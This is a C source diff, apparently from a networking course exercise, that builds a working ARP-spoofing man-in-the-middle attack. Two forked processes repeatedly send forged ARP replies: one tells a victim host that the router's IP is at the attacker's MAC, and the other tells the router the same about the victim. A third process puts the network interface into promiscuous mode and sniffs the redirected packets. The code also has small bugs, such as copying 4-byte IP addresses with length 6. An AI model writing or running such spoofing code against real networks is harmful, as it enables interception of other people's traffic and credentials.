@@ -10,7 +10,13 @@
 #include <net/if.h>
 #include <netinet/ether.h>
 #include <unistd.h>
+#include <pthread.h> 
+#include <signal.h>
 #include "arp.h"
+
+#define SPOOFING_DELAY 1
+#define ARP_OPERATION_REQUEST 1
+#define ARP_OPERATION_REPLY 2
 
 /* Constant parameters */
 /* TODO Change destination addresses to be a parameter */
@@ -18,18 +24,24 @@ uint8_t this_mac[6];
 uint8_t bcast_mac[6] =	{0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
 uint8_t dst_mac[6] =	{0x00, 0x00, 0x00, 0x22, 0x22, 0x22};
 uint8_t src_mac[6] =	{0x00, 0x00, 0x00, 0xaa, 0x00, 0x02};
-uint8_t src_ip[4] = {0x0a, 0x00, 0x00, 0x15}; // 10.0.0.21
-uint8_t dst_ip[4] = {0x0a, 0x00, 0x00, 0x14}; // 10.0.0.20
 
-union eth_buffer buffer_u;
+uint8_t ROUTER_IP[4] = {0x0a, 0x00, 0x00, 0x01};
+uint8_t VICTIM_IP[4] = {0x0a, 0x00, 0x00, 0x14};
+
+int *running;
 
 /* Processes functions, these are independent processes */
 
-int CreateSocket()
+void HandleSignal(int signal)
 {
-	struct ifreq if_idx, if_mac, ifopts;
+	printf("\n");
+	*running = 0;
+}
+
+int CreateSocket(struct sockaddr_ll *socket_address)
+{
+	struct ifreq ifopts, if_idx, if_mac;
 	char ifName[IFNAMSIZ];
-	//struct sockaddr_ll socket_address;
 	int sockfd;	
 	
 	/* Get interface name */
@@ -44,15 +56,14 @@ int CreateSocket()
 	ioctl(sockfd, SIOCGIFFLAGS, &ifopts);
 	ifopts.ifr_flags |= IFF_PROMISC;
 	ioctl(sockfd, SIOCSIFFLAGS, &ifopts);
-
-	//TODO se pa eh soh pra fazer send
+	
 	/* Get the index of the interface */
 	memset(&if_idx, 0, sizeof(struct ifreq));
 	strncpy(if_idx.ifr_name, ifName, IFNAMSIZ-1);
 	if (ioctl(sockfd, SIOCGIFINDEX, &if_idx) < 0)
 		perror("SIOCGIFINDEX");
-	//socket_address.sll_ifindex = if_idx.ifr_ifindex;
-	//socket_address.sll_halen = ETH_ALEN;
+	socket_address->sll_ifindex = if_idx.ifr_ifindex;
+	socket_address->sll_halen = ETH_ALEN;
 	
 	/* Get the MAC address of the interface */
 	memset(&if_mac, 0, sizeof(struct ifreq));
@@ -64,22 +75,94 @@ int CreateSocket()
 	return sockfd;
 }
 
-/**/
-void P1()
+void PopulateEthBuffer(union eth_buffer *buffer_u)
 {
+	/* fill the Ethernet frame header */
+	memcpy(buffer_u->cooked_data.ethernet.dst_addr, bcast_mac, 6);
+	memcpy(buffer_u->cooked_data.ethernet.src_addr, src_mac, 6);
+	buffer_u->cooked_data.ethernet.eth_type = htons(ETH_P_ARP);
+
+	/* fill payload data (incomplete ARP request example) */
+	buffer_u->cooked_data.payload.arp.hw_type = htons(1);
+	buffer_u->cooked_data.payload.arp.prot_type = htons(ETH_P_IP);
+	buffer_u->cooked_data.payload.arp.hlen = 6;
+	buffer_u->cooked_data.payload.arp.plen = 4;
+	buffer_u->cooked_data.payload.arp.operation = htons(ARP_OPERATION_REPLY);
 }
 
-/**/
+/* ARP Spoofing To Victim */
+void P1()
+{
+	signal(SIGINT, HandleSignal);
+	signal(SIGABRT, HandleSignal);
+	
+	union eth_buffer buffer_u;
+	
+	struct sockaddr_ll socket_address;
+	
+	int sockfd = CreateSocket(&socket_address);
+	
+	PopulateEthBuffer(&buffer_u);
+	
+	memcpy(buffer_u.cooked_data.payload.arp.src_hwaddr, src_mac, 6);
+	memcpy(buffer_u.cooked_data.payload.arp.src_paddr, ROUTER_IP, 6);
+	memset(buffer_u.cooked_data.payload.arp.tgt_hwaddr, 0, 6);
+	memcpy(buffer_u.cooked_data.payload.arp.tgt_paddr, VICTIM_IP, 6);
+
+	/* Send it.. */
+	while (*running)
+	{
+		memcpy(socket_address.sll_addr, dst_mac, 6);
+		if (sendto(sockfd, buffer_u.raw_data, sizeof(struct eth_hdr) + sizeof(struct arp_packet), 0, (struct sockaddr*)&socket_address, sizeof(struct sockaddr_ll)) < 0)
+			printf("P1 Send failed\n");
+		
+		sleep(SPOOFING_DELAY);
+	}
+}
+
+/* ARP Spoofing To Victim */
 void P2()
 {
+	signal(SIGINT, HandleSignal);
+	signal(SIGABRT, HandleSignal);
+	
+	union eth_buffer buffer_u;
+	
+	struct sockaddr_ll socket_address;
+	
+	int sockfd = CreateSocket(&socket_address);
+	
+	PopulateEthBuffer(&buffer_u);
+	
+	memcpy(buffer_u.cooked_data.payload.arp.src_hwaddr, src_mac, 6);
+	memcpy(buffer_u.cooked_data.payload.arp.src_paddr, VICTIM_IP, 6);
+	memset(buffer_u.cooked_data.payload.arp.tgt_hwaddr, 0, 6);
+	memcpy(buffer_u.cooked_data.payload.arp.tgt_paddr, ROUTER_IP, 6);
+
+	/* Send it.. */
+	while (*running)
+	{
+		memcpy(socket_address.sll_addr, dst_mac, 6);
+		if (sendto(sockfd, buffer_u.raw_data, sizeof(struct eth_hdr) + sizeof(struct arp_packet), 0, (struct sockaddr*)&socket_address, sizeof(struct sockaddr_ll)) < 0)
+			printf("P1 Send failed\n");
+		
+		sleep(SPOOFING_DELAY);
+	}
 }
 
 /**/
 void P3()
 {
+	signal(SIGINT, HandleSignal);
+	signal(SIGABRT, HandleSignal);
+	
+	union eth_buffer buffer_u;
+	
 	int numbytes, i;
 	struct in_addr addr;
-	int sockfd = CreateSocket();
+	struct sockaddr_ll socket_address;
+	
+	int sockfd = CreateSocket(&socket_address);	
 	
 	printf("this mac address: ");
 	for (i = 0; i < 5; i++)
@@ -88,8 +171,9 @@ void P3()
 	printf("\n");
 	
 	/* To receive data (in this case we will inspect ARP and IP packets)... */
+	//TODO nao ler pacotes que sao do P1 ou do P2, verificar o srcip e srcmac
 
-	while (1){
+	while (*running){
 		numbytes = recvfrom(sockfd, buffer_u.raw_data, ETH_LEN, 0, NULL, NULL);
 		
 		if (buffer_u.cooked_data.ethernet.eth_type == ntohs(ETH_P_ARP)){
@@ -134,84 +218,17 @@ void P3()
 			continue;
 		}
 				
-		printf("Got a packet that is not either ARP or IP, %d bytes\n", numbytes);
+		printf("Got a packet that is neither ARP or IP, %d bytes\n", numbytes);
 	}
 }
 
 int main(int argc, char *argv[])
-{
-	struct ifreq if_idx, if_mac, ifopts;
-	char ifName[IFNAMSIZ];
-	struct sockaddr_ll socket_address;
-	int sockfd, i;
-	//int numbytes;
-	//struct in_addr addr;
-	
-	/* Get interface name */
-	/*if (argc > 1)
-		strcpy(ifName, argv[1]);
-	else
-		strcpy(ifName, DEFAULT_IF);*/
-		
-	/* Open RAW socket */
-	/*if ((sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) == -1)
-		perror("socket");*/
-	
-	/* Set interface to promiscuous mode */
-	/*strncpy(ifopts.ifr_name, ifName, IFNAMSIZ-1);
-	ioctl(sockfd, SIOCGIFFLAGS, &ifopts);
-	ifopts.ifr_flags |= IFF_PROMISC;
-	ioctl(sockfd, SIOCSIFFLAGS, &ifopts);*/
+{		
+	running = malloc(sizeof (int32_t));
+	*running = 1;
+	int processNr;
 
-	/* Get the index of the interface */
-	/*memset(&if_idx, 0, sizeof(struct ifreq));
-	strncpy(if_idx.ifr_name, ifName, IFNAMSIZ-1);
-	if (ioctl(sockfd, SIOCGIFINDEX, &if_idx) < 0)
-		perror("SIOCGIFINDEX");
-	socket_address.sll_ifindex = if_idx.ifr_ifindex;
-	socket_address.sll_halen = ETH_ALEN;*/
-
-	/* Get the MAC address of the interface */
-	/*memset(&if_mac, 0, sizeof(struct ifreq));
-	strncpy(if_mac.ifr_name, ifName, IFNAMSIZ-1);
-	if (ioctl(sockfd, SIOCGIFHWADDR, &if_mac) < 0)
-		perror("SIOCGIFHWADDR");	
-	memcpy(this_mac, if_mac.ifr_hwaddr.sa_data, 6);
-	
-	printf("this mac address: ");
-	for (i = 0; i < 5; i++)
-		printf("%02x:", this_mac[i]);
-	printf("%02x", this_mac[5]);
-	printf("\n");*/
-	    
-	/* End of configuration. Now we can send and receive data using raw sockets. */
-
-
-	/* To send data (in this case we will cook an ARP packet and broadcast it =])... */
-	
-	/* fill the Ethernet frame header */
-	/*memcpy(buffer_u.cooked_data.ethernet.dst_addr, bcast_mac, 6);
-	memcpy(buffer_u.cooked_data.ethernet.src_addr, src_mac, 6);
-	buffer_u.cooked_data.ethernet.eth_type = htons(ETH_P_ARP);*/
-
-	/* fill payload data (incomplete ARP request example) */
-	/*buffer_u.cooked_data.payload.arp.hw_type = htons(1);
-	buffer_u.cooked_data.payload.arp.prot_type = htons(ETH_P_IP);
-	buffer_u.cooked_data.payload.arp.hlen = 6;
-	buffer_u.cooked_data.payload.arp.plen = 4;
-	buffer_u.cooked_data.payload.arp.operation = htons(1);
-	memcpy(buffer_u.cooked_data.payload.arp.src_hwaddr, src_mac, 6);
-	memcpy(buffer_u.cooked_data.payload.arp.src_paddr, src_ip, 6);
-	memset(buffer_u.cooked_data.payload.arp.tgt_hwaddr, 0, 6);
-	memcpy(buffer_u.cooked_data.payload.arp.tgt_paddr, dst_ip, 6);*/
-
-	/* Send it.. */
-	/*memcpy(socket_address.sll_addr, dst_mac, 6);
-	if (sendto(sockfd, buffer_u.raw_data, sizeof(struct eth_hdr) + sizeof(struct arp_packet), 0, (struct sockaddr*)&socket_address, sizeof(struct sockaddr_ll)) < 0)
-		printf("Send failed\n");*/
-
-	P3();
-	/*int pid = fork();
+	int pid = fork();
 	
 	if (pid == -1)
 	{
@@ -230,17 +247,22 @@ int main(int argc, char *argv[])
 	
 		if (pid) // P1
 		{
+			processNr = 1;
 			P1();
 		}
 		else // P3
 		{
+			processNr = 3;
 			P3();
 		}
 	}
 	else // P2
 	{
+		processNr = 2;
 		P2();
-	}*/	
+	}
+	
+	printf("Process %d stopping...\n", processNr);
 
 	return 0;
 }
